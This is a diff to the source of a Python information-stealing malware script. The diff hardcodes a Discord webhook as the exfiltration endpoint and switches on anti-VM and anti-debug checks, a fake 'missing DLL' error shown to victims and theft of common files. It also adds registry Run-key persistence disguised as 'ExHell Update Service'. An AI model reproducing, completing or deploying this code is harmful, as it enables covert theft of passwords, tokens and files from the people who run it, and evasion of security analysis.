@@ -12,21 +12,20 @@ import base64
 import time
 
 
-webhook = "%WEBHOOK%"
-discord_injection = bool("%injection%")
-startup_method = "%startup_method%".lower()
-Anti_VM = bool("%Anti_VM%")
-AntiDebug = bool("%Anti_Debug%")
-FakeError = (
-    bool("%fake_error%"),
-    (
-        "System Error",
-        "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem",
-        0,
-    ),
-)
-StealFiles = bool("%StealCommonFiles%")
+webhook = "https://discord.com/api/webhooks/1347000526759526482/D_EY10ilYFjC-vjnIlLt0kz-cjReqBRQu4sz3gO6Gg36c8HVRhjZhqHeTAOeryhllB1d"
+startup_method = "auto".lower()
+Anti_VM = True
+AntiDebug = True
+FakeError = True
 
+# Tuple for error message
+error_message = (
+    "System Error",
+    "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem",
+    0,
+)
+
+StealFiles = True
 
 class Variables:
     Passwords = list()
@@ -3363,6 +3362,29 @@ class Startup:
         except Exception as e:
             print(str(e))  # print error if has error
 
+    async def RegeditStartup(self) -> None:  # regedit method for startup
+        try:
+            if (
+                not self.Privalage
+            ):  # if the code not running admin privilage, copy to HKCU
+                process = await asyncio.create_subprocess_shell(
+                    f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "ExHell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    shell=True,
+                )
+                await process.communicate()
+            else:  # if the code running admin privilage, copy to HKLM
+                process = await asyncio.create_subprocess_shell(
+                    f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "ExHell Update Service" /t REG_SZ /d "{self.ToPath}" /f',
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    shell=True,
+                )
+                await process.communicate()
+        except Exception as e:
+            print(str(e))
+
     async def FolderStartup(self):  # folder method for startup
         try:
             if (
@@ -3763,13 +3785,10 @@ if __name__ == "__main__":
             start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().FunctionRunner())
-            asyncio.run(AntiDebug().FunctionRunner())
             if not startup_method == "no-startup":
                 asyncio.run(Startup().main())
             asyncio.run(Fakerror())
             main_instance = Main()
-            asyncio.run(main_instance.FunctionRunner())
-            asyncio.run(DiscordInjection().InjectIntoToDiscord())
             if StealFiles == True:
                 asyncio.run(StealCommonFiles().StealFiles())
             print(
